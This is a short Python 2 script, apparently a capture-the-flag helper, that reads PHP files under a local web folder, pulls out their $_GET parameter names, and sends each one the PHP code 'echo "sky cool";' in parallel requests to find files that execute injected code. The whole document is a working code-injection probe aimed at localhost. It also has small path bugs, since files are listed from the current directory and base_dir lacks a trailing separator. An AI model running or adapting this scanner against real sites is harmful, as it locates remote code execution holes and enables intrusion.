import os

file_list = os.listdir(os.getcwd())
import requests
from multiprocessing import Pool

base_url = "http://localhost:801/src/"
base_dir = "D:\\phpStudy\\PHPTutorial\\WWW\\src"


def extracts(f):
    gets = []
    with open(base_dir + f, 'r') as f:
        lines = f.readlines()
        lines = [i.strip() for i in lines]
        for line in lines:

            if line.find("$_GET['") > 0:
                start_pos = line.find("$_GET['") + len("$_GET['")
                end_pos = line.find("'", start_pos)                
                gets.append(line[start_pos:end_pos])

    return gets

def exp(start,end):
    for i in range(start,end):
        filename = file_list[i]
        gets = extracts(filename)
        print "try: %s"%filename 
        for get in gets:
            now_url = "%s%s?%s=%s"%(base_url,filename,get,'echo "sky cool";')
            r = requests.get(now_url)
            if 'sky cool' in r.content:
                print now_url
                break
    print "%s~%s not found!"%(start,end)


def main():
    pool = Pool(processes=15)    # set the processes max number 3
    for i in range(0,len(file_list),len(file_list)/15):
        pool.apply_async(exp,(i,i+len(file_list)/15,))
    pool.close()
    pool.join()


if __name__ == "__main__":
    main()